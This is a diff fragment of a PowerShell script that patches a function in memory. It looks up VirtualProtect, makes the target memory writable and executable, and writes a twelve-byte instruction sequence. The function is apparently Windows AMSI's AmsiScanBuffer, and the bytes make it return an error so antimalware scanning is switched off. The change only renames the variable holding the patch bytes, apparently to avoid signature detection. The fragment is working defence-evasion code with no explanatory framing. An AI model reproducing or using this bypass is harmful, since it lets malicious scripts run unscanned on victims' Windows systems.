@@ -42,9 +42,8 @@ $params = @("msi", "S", "B", "ff");
 $oldProtectionBuffer = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+$input = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 
-$input = $buf
 $zero = 0
 $pointer = $funcAddr
 $twelve = 12
